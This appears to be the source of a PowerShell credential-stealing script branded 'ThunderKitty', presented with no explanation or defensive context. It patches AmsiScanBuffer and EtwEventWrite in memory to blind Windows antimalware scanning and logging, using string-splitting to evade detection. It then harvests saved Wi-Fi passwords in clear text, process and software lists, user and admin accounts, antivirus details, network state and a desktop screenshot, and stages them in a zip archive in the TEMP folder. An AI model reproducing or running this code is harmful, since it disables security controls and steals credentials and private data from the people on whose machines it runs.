$amsixetwpatch = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Patcher
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    public static bool PatchAmsi()
    {
        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }

    public static void PatchEtwEventWrite()
    {
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        string ntdllModuleName = "ntdll.dll";
        string etwEventWriteFunctionName = "EtwEventWrite";

        IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
        IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);

        byte[] retOpcode = { 0xC3 }; // RET opcode

        uint oldProtect;
        VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
        
        int bytesWritten;
        WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
    }
}
"@
Add-Type -TypeDefinition $amsixetwpatch -Language CSharp
[Patcher]::PatchAmsi()
[Patcher]::PatchEtwEventWrite()

Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$Profiles = @()
$Profiles += (netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
$wifi = $Profiles | ForEach-Object {
    $SSID = $_
    $getpass = (netsh wlan show profile name="$_" key=clear) | Select-String 'Key Content\W+\:(.+)$'
    if ($getpass) {
        $pass = $getpass.Matches.Groups[1].Value.Trim()
        [PSCustomObject]@{
            Wireless_Network_Name = $SSID
            Password              = $pass
        }
    }
}

$sess = Join-Path -Path $env:TEMP -ChildPath "ThunderKitty\SystemInfo"
New-Item -ItemType Directory -Force -Path $sess | Out-Null

$wifi | Out-File -FilePath "$sess\ThunderKitty-WifiPassword.txt" -Encoding ASCII -Width 50
(Get-Process | Select-Object ProcessName, Id) | Out-File "$sess\ThunderKitty-RunningPrograms.txt" -Encoding ASCII -Width 50
(Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
Select-Object DisplayName, DisplayVersion, Publisher, InstallDate) | Out-File "$sess\ThunderKitty-InstalledPrograms.txt" -Encoding ASCII -Width 50

$sys = Get-CimInstance Win32_ComputerSystem
$OS = Get-CimInstance Win32_OperatingSystem
$gpu = Get-CimInstance Win32_VideoController

$systemInfo = @(
    "Computer Name: $($sys.Name)",
    "Manufacturer: $($sys.Manufacturer)",
    "Model: $($sys.Model)",
    "Total Physical Memory: $([math]::round($sys.TotalPhysicalMemory / 1MB, 2)) MB",
    "OS Name: $($OS.Caption)",
    "OS Version: $($OS.Version)",
    "OS Architecture: $($OS.OSArchitecture)",
    "GPU Name: $($gpu.Name)",
    "GPU Driver Version: $($gpu.DriverVersion)"
)
$systemInfo | Out-File "$sess\ThunderKitty-SystemInfo.txt" -Encoding ASCII -Width 50

$windkitty2save = Join-Path -Path $env:TEMP -ChildPath "ThunderKitty"
$windbit = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height)
$windkittygrep = [System.Drawing.Graphics]::FromImage($windbit)
$windkittygrep.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, [System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $windbit.Size)
$2savescreenkitty = Join-Path -Path $windkitty2save -ChildPath "ThunderKitty-DesktopScreenshot.png"
$windbit.Save($2savescreenkitty, [System.Drawing.Imaging.ImageFormat]::Png)
$windkittygrep.Dispose()
$windbit.Dispose()

$scrp = @{
    "Current User" = "whoami /all"
    "Local Network" = "ipconfig /all"
    "FireWall Config" = "netsh advfirewall show allprofiles"
    "Local Users" = "net user"
    "Admin Users" = "net localgroup administrators"
    "Anti-Virus Programs" = "WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe"
    "Port Information" = "netstat -ano"
    "Routing Information" = "route print"
    "Hosts" = "type c:\Windows\system32\drivers\etc\hosts"
    "WIFI Networks" = "netsh wlan show profile"
    "Startups" = "wmic startup get command, caption"
    "DNS Records" = "ipconfig /displaydns"
    "User Group Information" = "net localgroup"
    "ARP Table" = "arp -a"
}

$thunder = "$sess\ThunderKitty-ScrapedCMDS.txt"
foreach ($key in $scrp.Keys) {
    Add-Content -Path $thunder -Value "`n------THUNDERKITTY------[$key]------THUNDERKITTY------"
    $put = Invoke-Expression $scrp[$key]
    Add-Content -Path $thunder -Value $put
}
$tempPath = [System.IO.Path]::GetTempPath()
Compress-Archive -LiteralPath $windkitty2save -DestinationPath "$tempPath\ThunderKitty.zip"
cls


